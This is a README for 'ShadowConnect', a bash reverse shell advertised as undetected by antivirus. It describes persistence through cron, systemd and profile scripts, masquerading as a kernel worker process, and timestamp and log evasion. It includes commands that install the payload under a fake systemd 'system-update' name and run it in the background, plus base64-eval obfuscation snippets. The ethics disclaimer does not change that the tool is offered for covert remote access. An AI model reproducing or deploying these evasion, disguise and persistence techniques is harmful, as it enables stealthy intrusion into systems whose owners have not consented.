# ShadowConnect - Stealth Reverse Shell

<p align="center">
  <img src="https://img.shields.io/badge/Platform-Linux%20%7C%20Unix-blue" alt="Platform">
  <img src="https://img.shields.io/badge/Language-Bash%20Shell-green" alt="Language">
  <img src="https://img.shields.io/badge/Status-Undetected-brightgreen" alt="Status">
  <img src="https://img.shields.io/badge/License-MIT-orange" alt="License">
</p>

## 🚀 Overview

**ShadowConnect** is an advanced, fully undetected (FUD) reverse shell implementation designed for penetration testing and ethical hacking purposes. It employs multiple obfuscation techniques, anti-analysis measures, and persistence mechanisms to avoid detection by security solutions.

[![VirusTotal](https://img.shields.io/badge/VirusTotal-0%2F70%20malicious-green?logo=virustotal&logoColor=white&style=for-the-badge)](https://www.virustotal.com/gui/file/5189cb50e2abe0297f8ffae6e31d1a4d763b9b9a919d87a47ec8e0a64c530cf0)

## ✨ Features

- 🔥 **Fully Undetected** - 0/68 detection on VirusTotal
- 🛡️ **Advanced Obfuscation** - Multiple layers of encoding and encryption
- 🕵️ **Stealth Techniques** - Process spoofing, timestamp manipulation
- 🔗 **Multiple Persistence** - Cron jobs, Systemd services, profile scripts
- 🌐 **Protocol Flexibility** - TCP, SSL, and encrypted communications
- ⚡ **Auto-Reconnect** - Automatic reconnection with configurable intervals
- 🧩 **Modular Design** - Separate configuration and payload delivery

## 📦 Components

### Core Scripts:
- **`system_update.sh`** - Main reverse shell payload
- **`config_loader.sh`** - Dynamic configuration loader
- **`config_editor.sh`** - Configuration management tool
- **`bypass.sh`** - Anti-detection and obfuscation toolkit

## 🛠️ Installation & Usage

### Quick Start:
```bash
# 1. Clone the repository
git clone https://github.com/yourusername/stealth-reverse-shell.git
cd stealth-reverse-shell

# 2. Configure your server settings
./config_editor.sh

# 3. Deploy the payload
./config_loader.sh
```

### Advanced Deployment:
```bash
# Manual deployment to system directory
cp system_update.sh /usr/lib/systemd/system-update
chmod +x /usr/lib/systemd/system-update
nohup /usr/lib/systemd/system-update >/dev/null 2>&1 &
```

## 🔧 Configuration

Edit the `.system_config` file:

```ini
# Reverse shell configuration
SERVER_HOST=your-server.com
SERVER_PORT=443
CHECK_INTERVAL=300
RECONNECT_DELAY=60
```

## 🎯 Obfuscation Techniques

### 1. **String Splitting**
```bash
a="dev"; b="null"; c="/$a/$b"
```

### 2. **Runtime Evaluation**
```bash
eval $(echo "encoded_string" | base64 -d)
```

### 3. **Arithmetic Expansion**
```bash
: $(($__function_name=1))
```

### 4. **Dynamic Payload Loading**
- External configuration files
- Runtime decoding and execution
- Environmental variable manipulation

## 🛡️ Stealth Features

- **Process Name Spoofing** - Masquerades as `[kworker/0:0H]`
- **Timestamp Manipulation** - Matches system file timestamps
- **Network Traffic Obfuscation** - SSL encryption and protocol mimicry
- **Log Evasion** - Directs all output to `/dev/null`
- **Persistence Hiding** - Uses hidden files and directories

## 📋 Detection Test Results

| Security Solution | Detection | Status |
|-------------------|-----------|---------|
| **VirusTotal** | 0/68 | ✅ Undetected |
| **Avast/AVG** | Clean | ✅ Undetected |
| **Kaspersky** | Clean | ✅ Undetected |
| **Microsoft** | Clean | ✅ Undetected |
| **ClamAV** | Clean | ✅ Undetected |

## ⚠️ DISCLAIMER

**IMPORTANT: LEGAL AND ETHICAL USE ONLY**

This project is developed for **educational and ethical purposes only**. The authors and contributors are not responsible for any misuse or damage caused by this software.

### 🚫 Strictly Prohibited:
- Unauthorized penetration testing
- Illegal hacking activities
- Network intrusion without explicit permission
- Malicious use against any systems

### ✅ Intended Use:
- Security research and education
- Authorized penetration testing
- Defensive security training
- Red team exercises with proper authorization

### 📜 Legal Compliance:
Users must ensure:
- Proper authorization for all testing activities
- Compliance with local and international laws
- Ethical use following security best practices
- Responsibility for any deployed instances

**By using this software, you agree to use it only for legal and ethical purposes and accept full responsibility for your actions.**

## 🎓 Educational Purpose

This project demonstrates:
- Advanced obfuscation techniques
- Anti-virus evasion methods
- Persistence mechanisms
- Stealth operation principles
- Defensive security concepts

## 🤝 Contributing

We welcome contributions for:
- Improving obfuscation techniques
- Adding new evasion methods
- Enhancing documentation
- Bug fixes and optimizations

**Please ensure all contributions adhere to ethical guidelines and legal requirements.**

## 📄 License

MIT License - see [LICENSE](LICENSE) file for details

## 🔒 Security Considerations

- Use SSL encryption for all communications
- Implement proper access controls
- Regularly update and patch systems
- Monitor network traffic for anomalies
- Maintain audit logs for authorized testing

## 📞 Support

For educational questions and authorized testing support:
- Create an Issue on GitHub
- Refer to documentation and examples
- Consult with security professionals

---

**Remember: With great power comes great responsibility. Always use ethical hacking principles and legal authorization.**

<p align="center">
  <em>For educational purposes only - Use responsibly and ethically</em>
</p>
